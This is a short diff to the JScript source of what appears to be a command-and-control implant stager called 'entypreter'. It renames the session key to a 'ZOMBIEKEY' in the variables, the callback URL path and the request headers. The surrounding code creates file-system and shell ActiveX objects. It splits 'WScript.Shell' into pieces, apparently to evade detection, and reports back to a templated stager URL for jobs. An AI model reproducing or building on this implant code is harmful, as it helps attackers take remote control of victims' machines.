@@ -3,9 +3,9 @@ var entypreter = {};
 entypreter.FS = new ActiveXObject("Scripting.FileSystemObject");
 entypreter.WS = new ActiveXObject("WScrip"+"t.Shell");
 entypreter.STAGER = "~URL~";
-entypreter.SESSIONKEY = "~SESSIONKEY~";
+entypreter.ZOMBIEKEY = "~ZOMBIEKEY~";
 entypreter.JOBKEY = "~JOBKEY~";
-entypreter.JOBKEYPATH = "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=";
+entypreter.JOBKEYPATH = "~URL~?~SESSIONNAME~=~ZOMBIEKEY~;~JOBNAME~=";
 entypreter.EXPIRE = "~_EXPIREEPOCH_~";
 
 /**
@@ -402,7 +402,7 @@ entypreter.work = {};
 entypreter.work.applyDefaultHeaders = function(headers)
 {
     var headers = (typeof(headers) !== "undefined") ? headers : {};
-    headers["SESSIONKEY"] = entypreter.SESSIONKEY;
+    headers["ZOMBIEKEY"] = entypreter.ZOMBIEKEY;
     headers["JOBKEY"] = entypreter.JOBKEY;
 }
 */
